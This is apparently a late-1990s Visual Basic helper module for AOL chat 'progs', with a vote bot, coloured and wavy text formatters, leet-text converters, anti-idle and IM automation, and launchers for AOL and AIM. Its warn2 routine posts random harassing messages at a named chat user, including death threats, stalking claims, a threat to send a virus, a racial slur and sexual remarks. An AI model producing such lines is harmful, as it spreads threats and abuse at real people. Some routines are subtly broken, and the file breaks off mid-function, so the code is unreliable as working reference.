Sub Voter_BOT(lbl1 As Label, lbl2 As Label)
rezulT$ = LCase(LastChatLine)

If rezulT$ = "/yes" Then
If SNFromLastChatLine = getuser() Then GoTo FF:
If SNFromLastChatLine = "OnlineHost" Then GoTo FF:
whoe$ = SNFromLastChatLine
lbl1.caption = lbl1.caption + 1
sendchat "···÷••••^v(`(`-•" + whoe$ + " Your Vote has Been Counted"
TimeOut (0.7)
Else

If rezulT$ = "/no" Then
If SNFromLastChatLine = getuser() Then GoTo FF:
If SNFromLastChatLine = "OnlineHost" Then GoTo FF:
whoe$ = SNFromLastChatLine
lbl2.caption = lbl2.caption + 1
sendchat "···÷••••^v(`(`-•" + whoe$ + " Your Vote has Been Counted"
TimeOut (0.7)
End If
End If
FF:

End Sub

Sub warn2(Combo)
'ouwop
    Dim Dice2
    Randomize
    Dice2 = Int(30 * Rnd + 1)
If Dice2 = 1 Then BoldSendChat ("WaRnInG " + Combo + ", I know Taytuh Perzonaly"): Exit Sub
If Dice2 = 2 Then BoldSendChat ("WaRnInG " + Combo + ", I Am Coo wit  IXI"): Exit Sub
If Dice2 = 3 Then BoldSendChat ("WaRnInG " + Combo + ", IXI iz watching you!"): Exit Sub
If Dice2 = 4 Then BoldSendChat ("WaRnInG " + Combo + ", You now have 2 TOS violationz"): Exit Sub
If Dice2 = 5 Then BoldSendChat ("WaRnInG " + Combo + ", i will kill yo bitch azz"): Exit Sub
If Dice2 = 6 Then BoldSendChat ("WaRnInG " + Combo + ", Ouwop iz my frend"): Exit Sub
If Dice2 = 7 Then BoldSendChat ("WaRnInG " + Combo + ", Taytuh iz my frenD"): Exit Sub
If Dice2 = 8 Then BoldSendChat ("WaRnInG " + Combo + ", Can u say ""187""?"): Exit Sub
If Dice2 = 9 Then BoldSendChat ("WaRnInG " + Combo + ", My gat iz loaded"): Exit Sub
If Dice2 = 10 Then BoldSendChat ("WaRnInG " + Combo + ", Yo X-luva told me where u live"): Exit Sub
If Dice2 = 11 Then BoldSendChat ("WaRnInG " + Combo + ", I am veryyy mad"): Exit Sub
If Dice2 = 12 Then BoldSendChat ("WaRnInG " + Combo + ", I will send u a Viruz"): Exit Sub
If Dice2 = 13 Then BoldSendChat ("WaRnInG " + Combo + ", I love killin AOL Accountz"): Exit Sub
If Dice2 = 14 Then BoldSendChat ("WaRnInG " + Combo + ", My nervez are easily triggered"): Exit Sub
If Dice2 = 15 Then BoldSendChat ("WaRnInG " + Combo + ", Im callin ma niggaz"): Exit Sub
If Dice2 = 16 Then BoldSendChat ("WaRnInG " + Combo + ", u done fucked up now"): Exit Sub
If Dice2 = 17 Then BoldSendChat ("WaRnInG " + Combo + ", I know da Secrete PW for MazTa ProGG"): Exit Sub
If Dice2 = 18 Then BoldSendChat ("WaRnInG " + Combo + ", I am Uzing MazTa Progg"): Exit Sub
If Dice2 = 19 Then BoldSendChat ("WaRnInG " + Combo + ", &&$@#&$(#)@)@_#_@#@@!!"): Exit Sub
If Dice2 = 20 Then BoldSendChat ("WaRnInG " + Combo + ", Do you hear that Noize in your Comp?"): Exit Sub
If Dice2 = 21 Then BoldSendChat ("WaRnInG " + Combo + ", i know da URL to fill out a IXI APP"): Exit Sub
If Dice2 = 22 Then BoldSendChat ("WaRnInG " + Combo + ", Im known for stalking"): Exit Sub
If Dice2 = 23 Then BoldSendChat ("WaRnInG " + Combo + ", My dad iz SteveCase"): Exit Sub
If Dice2 = 24 Then BoldSendChat ("WaRnInG " + Combo + ", im frendz with the TOSGeneral"): Exit Sub
If Dice2 = 25 Then BoldSendChat ("WaRnInG " + Combo + ", im Ouwop on a <><"): Exit Sub
If Dice2 = 26 Then BoldSendChat ("WaRnInG " + Combo + ", i am god on a <><"): Exit Sub
If Dice2 = 27 Then BoldSendChat ("WaRnInG " + Combo + ", Im horny and Bi-Sexual"): Exit Sub
If Dice2 = 28 Then BoldSendChat ("WaRnInG " + Combo + ", i own all ouwopz proggz"): Exit Sub
If Dice2 = 29 Then BoldSendChat ("WaRnInG " + Combo + ", im da shiz'nit nit nit nit NIT!"): Exit Sub
If Dice2 = 30 Then BoldSendChat ("WaRnInG " + Combo + ", i cant B Touched!!!"): Exit Sub

End Sub



Function YellowBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowBlue = Msg
End Function
Function YellowBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowBlack = Msg
End Function



Function RedYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedYellow = Msg
End Function
Function RedPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 0, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedPurple = Msg
End Function
Function RedGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedGreen = Msg
End Function
Function RedBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedBlue = Msg
End Function
Function RedBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedBlack = Msg
End Function
Function PurpleYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleYellow = Msg
End Function
Function PurpleRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 0, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleRed = Msg
End Function

Function waiT(HLong)
'Same as timeout
Current = Timer
Do While Timer - Current < Val(HLong)
DoEvents
Loop
End Function



Function FileInput(FileName As String)
free = FreeFile
Open FileName For Input As free
    i = FileLen(FileName)
    X = Input(i, free)
Close free
    FileInput = X
End Function


Function FileInput2(FileName As String)
free = FreeFile
Open FileName For Input As free
    i = FileLen(FileName)
    X = Input(i - 2, free)
Close free
    FileInput2 = X
End Function

Sub antiidle()
'OuwoP
If FindAwin("Write Mail") Then Exit Sub
If FindAwin("Attach") Then Exit Sub
If FindAwin("Attachments") Then Exit Sub
If FindAwin("America  Online") Then Exit Sub
aomodal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(aomodal%, "_AOL_Icon")
cLickiCoN (AOIcon%)
End Sub

Function getcaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))

getcaption = hwndTitle$
End Function
Function IsUserOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function
Function IsAOL4Open()
AOL% = FindWindow(AolMdi(), vbNullString)
If AOL% <> 0 Then
   IsAOL4Open = 1
Else:
   IsAOL4Open = 0
End If
End Function
Function AOLGetUser()
''ouwop
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLGetUser = User
End Function
Sub killwait()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")
For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon
Call TimeOut(0.05)
cLickiCoN (AOIcon%)
Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
aoicon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And aoicon2% <> 0
Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub





Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function
Function WavYChaTRedBlack(TheText As String)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    l$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sup>" & l$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#800000" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#800000" & Chr$(34) & ">" & t$
Next w
WavYChaTRedBlack = (p$)
End Function

Public Function MailCountNew() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountNew& = Count&
End Function
Sub IMBuddy(Recipiant, message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
buddy% = FindChildByTitle(MDI%, "Buddy List Window")
If buddy% = 0 Then
    XAOL4_Keyword ("BuddyView")
    Do: DoEvents
    Loop Until buddy% <> 0
End If
AOIcon% = FindChildByClass(buddy%, "_AOL_Icon")
For l = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next l
Call TimeOut(0.01)
cLickiCoN (AOIcon%)
Do: DoEvents
imwin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(imwin%, "_AOL_Edit")
AORich% = FindChildByClass(imwin%, "RICHCNTL")
AOIcon% = FindChildByClass(imwin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)
For X = 1 To 9
   AOIcon% = GetWindow(AOIcon%, 2)
Next X
Call TimeOut(0.01)
cLickiCoN (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
imwin% = FindChildByTitle(MDI%, "Send Instant Message")
okwin% = FindWindow("#32770", "America Online")
If okwin% <> 0 Then Call SendMessage(okwin%, WM_CLOSE, 0, 0): closer2 = SendMessage(imwin%, WM_CLOSE, 0, 0): Exit Do
If imwin% = 0 Then Exit Do
Loop
End Sub
Function WavYChaTGrayPurple(TheText As String)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    l$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#c0c0c0" & Chr$(34) & "><sup>" & l$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#ff00ff" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#800080" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#ff00ff" & Chr$(34) & ">" & t$
Next w
WavYChaTGrayPurple = (p$)
End Function
Function StringInList(thelist As ListBox, FindMe As String)
If thelist.listcount = 0 Then GoTo Nope
For a = 0 To thelist.listcount - 1
thelist.ListIndex = a
If UCase(thelist.Text) = UCase(FindMe) Then
StringInList = a
Exit Function
End If
Next a
Nope:
StringInList = -1
End Function
Function WavYChaTRedGreen(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & t$
Next w
WavYChaTRedGreen = (p$)
End Function
Function WavYChaTRedBlue(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next w
WavYChaTRedBlue = (p$)
End Function

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub
Sub EliteTalker(word$)
Made$ = ""
For q = 1 To Len(word$)
    Letter$ = ""
    Letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If Letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If Letter$ = "b" Then Leet$ = "b"
    If Letter$ = "c" Then Leet$ = "ç"
    If Letter$ = "d" Then Leet$ = "d"
    If Letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If Letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If Letter$ = "j" Then Leet$ = ",j"
    If Letter$ = "n" Then Leet$ = "ñ"
    If Letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If Letter$ = "s" Then Leet$ = "š"
    If Letter$ = "t" Then Leet$ = "†"
    If Letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If Letter$ = "w" Then Leet$ = "vv"
    If Letter$ = "y" Then Leet$ = "ÿ"
    If Letter$ = "0" Then Leet$ = "Ø"
    If Letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If Letter$ = "B" Then Leet$ = "ß"
    If Letter$ = "C" Then Leet$ = "Ç"
    If Letter$ = "D" Then Leet$ = "Ð"
    If Letter$ = "E" Then Leet$ = "Ë"
    If Letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If Letter$ = "N" Then Leet$ = "Ñ"
    If Letter$ = "O" Then Leet$ = "Õ"
    If Letter$ = "S" Then Leet$ = "Š"
    If Letter$ = "U" Then Leet$ = "Û"
    If Letter$ = "W" Then Leet$ = "VV"
    If Letter$ = "Y" Then Leet$ = "Ý"
    If Letter$ = "`" Then Leet$ = "´"
    If Letter$ = "!" Then Leet$ = "¡"
    If Letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = Letter$
    Made$ = Made$ & Leet$
Next q
sendchat (Made$)
End Sub










Function CoLoRChaTBlueBlack(TheText As String)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#00F" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next w
CoLoRChaT = p$
End Function
Function ColorChatRedGreen(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & t$
Next w
ColorChatRedGreen = p$

End Function
Function WavyChatBlueBlack(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next w
WavyChatBlueBlack = (p$)
End Function



Function ColorChatRedBlue(TheText)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next w
ColorChatRedBlue = p$

End Function


Function TrimTime()
b$ = Left$(time$, 5)
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(b$, 3) & " " & Ap$
End Function



Function TrimTime2()
b$ = time$
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(b$, 5) & " " & Ap$
End Function
Function EliteText(word$)
Made$ = ""
For q = 1 To Len(word$)
    Letter$ = ""
    Letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If Letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If Letter$ = "b" Then Leet$ = "b"
    If Letter$ = "c" Then Leet$ = "ç"
    If Letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If Letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If Letter$ = "j" Then Leet$ = ",j"
    If Letter$ = "n" Then Leet$ = "ñ"
    If Letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If Letter$ = "s" Then Leet$ = "š"
    If Letter$ = "t" Then Leet$ = "†"
    If Letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If Letter$ = "w" Then Leet$ = "vv"
    If Letter$ = "y" Then Leet$ = "ÿ"
    If Letter$ = "0" Then Leet$ = "Ø"
    If Letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If Letter$ = "B" Then Leet$ = "ß"
    If Letter$ = "C" Then Leet$ = "Ç"
    If Letter$ = "D" Then Leet$ = "Ð"
    If Letter$ = "E" Then Leet$ = "Ë"
    If Letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If Letter$ = "N" Then Leet$ = "Ñ"
    If Letter$ = "O" Then Leet$ = "Õ"
    If Letter$ = "S" Then Leet$ = "Š"
    If Letter$ = "U" Then Leet$ = "Û"
    If Letter$ = "W" Then Leet$ = "VV"
    If Letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = Letter$
    Made$ = Made$ & Leet$
Next q

EliteText = Made$

End Function


Sub imignore(thelist As ListBox)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% <> 0 Then
    For FindSN = 0 To thelist.listcount
        If LCase$(thelist.list(FindSN)) = LCase$(SNfromIM) Then
            BadIM% = IM%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next FindSN
End If
End Sub

Sub HideAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 0)
End Sub

Sub ShowAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 5)
End Sub
Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLitemid = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLitemid, 0&)

End Sub
Sub AIM_RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("_oscar_buddylistwin", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLitemid = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("_oscar_buddylistwin", vbNullString), 273, AOLitemid, 0&)

End Sub
Sub AIM_RunMenu2(menu1 As Integer, menu2 As Integer, menu3 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("_oscar_buddylistwin", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLitemid% = GetSubMenu(AOLSubMenu%, menu2)
AOLitemid2 = GetMenuItemID(AOLitemid%, menu3)

AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("_oscar_buddylistwin", vbNullString), 273, AOLitemid2, 0&)



End Sub
Function Wavy(TheText As String)
g$ = TheText
a = Len(g$)
For w = 1 To a Step 4
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)
    t$ = Mid$(g$, w + 3, 1)
    p$ = p$ & "<sup>" & r$ & "</sup>" & u$ & "<sub>" & s$ & "</sub>" & t$
Next w
Wavy = p$

End Function

Sub KillModal()
modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(modal%, WM_CLOSE, 0, 0)
End Sub
Sub AOL40_Load()
'ouwop

On Error Resume Next
Call Shell("C:\aol40\aol.exe", 1)
Call Shell("C:\aol40a\aol.exe", 1)
Call Shell("C:\aol40b\aol.exe", 1)
Call Shell("C:\america online 4.0\aol.exe", 1)
Call Shell("C:\america online 4.0a\aol.exe", 1)
Call Shell("C:\america online 40\aol.exe", 1)
If Err = 6 Then
MsgBox "Unable to Locate Your AOL4.0 - Put it Directory Renamed 'C:\America Online 4.0'", vbCritical, "ERROR LOCATING!"
End If

End Sub
Sub AOL50_Load()
'ouwop

On Error Resume Next
Call Shell("C:\aol50\aol.exe", 1)
Call Shell("C:\aol50a\aol.exe", 1)
Call Shell("C:\aol50b\aol.exe", 1)
Call Shell("C:\america online 5.0\aol.exe", 1)
Call Shell("C:\america online 5.0a\aol.exe", 1)
Call Shell("C:\america online 50\aol.exe", 1)
If Err = 6 Then
MsgBox "Unable to Locate Your AOL5.0 - Put it Directory Renamed 'C:\America Online 5.0'", vbCritical, "ERROR LOCATING!"
End If

End Sub

Sub AOL25_Load()
'ouwop
On Error Resume Next
Call Shell("C:\aol25\waol.exe", 1)
Call Shell("C:\aol25a\waol.exe", 1)
Call Shell("C:\aol25b\waol.exe", 1)
Call Shell("C:\america online 2.5\waol.exe", 1)
Call Shell("C:\america online 2.5a\waol.exe", 1)
Call Shell("C:\america online 25\waol.exe", 1)
If Err = 6 Then
MsgBox "Unable to Locate Your AOL2.5 - Put it Directory Renamed 'C:\AOL25'", vbCritical, "ERROR LOCATING!"
End If

End Sub
Sub AIM20_Load()
'ouwop
On Error Resume Next
Shell ("c:\program files\aim95\aim.exe")
Shell ("c:\program files\aim95\aim.exe")
Shell ("c:\program files\netscape\communicator\program\aim\aim.exe")
Shell ("c:\program files\netscape\communicator\program\aim\aim.exe")
Shell ("c:\aim\aim.exe")
Shell ("c:\aim\aim.exe")
Shell ("c:\aim95\aim.exe")
Shell ("c:\aim95\aim.exe")
Shell ("c:\aim2\aim.exe")
Shell ("c:\aim2\aim.exe")
Shell ("c:\program files\aim2\aim.exe")
Shell ("c:\program files\aim2\aim.exe")
Shell ("c:\online\aim\aim.exe")
Shell ("c:\online\aim\aim.exe")
Shell ("c:\program files\aim98\aim.exe")
Shell ("c:\program files\aim98\aim.exe")
If Err = 6 Then
MsgBox "Unable to Locate Your Aim Directory! , Try Renaming da Dir to C:\Aim95", vbCritical, "ERROR LOCATING!"
End If
End Sub
Sub AOLClose()

Call Window_Close(AOLWindow())
End Sub

Sub Window_Close(win)
' This is like killwin
Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub
Function AOLRoomCount()

chat% = findChatRoom()
list% = FindChildByClass(chat%, "_AOL_Listbox")
Count% = SendMessage(list%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function
Function AOLWindow()
AOLWindow = FindWindow("AOL Frame25", vbNullString)
End Function
Function NetWindow()
NetWindow = FindWindow("Afx: 400000:b:14d6:6:388f", vbNullString)
End Function



Function BlackBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
